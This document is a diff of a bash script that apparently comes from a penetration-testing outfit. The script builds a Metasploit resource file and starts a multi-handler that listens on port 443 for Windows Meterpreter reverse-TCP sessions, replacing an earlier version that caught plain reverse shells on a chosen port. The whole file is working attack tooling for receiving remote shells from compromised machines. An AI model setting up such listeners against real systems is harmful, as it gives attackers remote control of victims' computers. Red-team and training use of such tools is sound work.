@@ -1,5 +1,3 @@
-
-
 #!/bin/bash
 
 RED='\033[1;31m'
@@ -9,43 +7,41 @@ YELLOW='\033[49;93m'
 NC='\033[0m' # No Color
 
 echo -e "${YELLOW}"
-echo -e "+------------------------------------------------+"
-echo -e "|   Adversarial Informatics Combat MSF Listener  |"
-echo -e "|              cygienesolutions.com              |"
-echo -e "|       [Usage]: ./msf_handler_aic.sh <PORT>     |"
-echo -e "+------------------------------------------------+"
-#echo -e "${NC}"
+echo -e "+---_-----------------------------------------------+"
+echo -e "|  Adversarial Informatics MSF Meterpreter Handler  |"
+echo -e "|               cygienesolutions.com                |"
+echo -e "|   [Usage]: ./msf_handler_aic.sh <INF> <TARGET>    |"
+echo -e "+---------------------------------------------------+"
+echo -e "${NC}"
 if [ $# == 0 ] ; then
     echo -e "${GREEN}"
     echo -e "Description:"
-    echo -e "Execute this script with a port specification to"
-    echo -e "start an MSF multihandler on the local system."
-    echo -e "The local IP address is automatically assigned (eth0)."
+    echo -e "Starts the MSF Multi-Handler on port 443."
+    echo -e ""
+    echo -e "[Usage]: ./msf_handler_aic.sh tap0 192.168.1.44"
     echo -e "${NC}"
     exit 1; fi
 
-PORT=$1
-LOCALIP=$(ifconfig eth0 | grep 'inet' | cut -d: -f2 | awk '{print $2}')
+INTERFACE="$1"
+TARGET="$2"
+LOCALIP=$(ifconfig $INTERFACE | grep 'inet' | cut -d: -f2 | awk '{print $2}')
 
+
+# Creating a multi-handler, and backgrounding the process
+echo use exploit/multi/handler > handler.rc
+echo set PAYLOAD windows/meterpreter/reverse_tcp >> handler.rc
+echo set LHOST $LOCALIP >> handler.rc
+echo set LPORT 443 >> handler.rc
+echo set ExitOnSession false >> handler.rc
+echo exploit -j -z >> handler.rc
 echo -e "${GREEN}"
-echo -e "Ensuring MSF database is activated..."
-service postgresql start
+echo -e "Initiating MSF Multi-handler on port: 443"
 echo -e "${NC}"
+msfconsole -r ./handler.rc
+echo -e "Done."
+netstat -ano | grep 443
 
 
-echo -e "${GREEN}"
-echo -e "Building the listen.rc configuration file..."
-echo -e "${NC}"
 
-echo 'use exploit/multi/handler' > listen.rc
-echo 'set payload windows/shell/reverse_tcp' >> listen.rc
-echo 'set lhost' $LOCALIP >> listen.rc
-echo 'set lport' $PORT >> listen.rc
-echo 'set ExitOnSession false' >> listen.rc
-echo 'run' >> listen.rc
 
-echo -e "${GREEN}"
-echo -e "Starting the MSF Multihandler with a shell_reverse_tcp..."
-echo -e "${NC}"
 
-msfconsole -r listen.rc
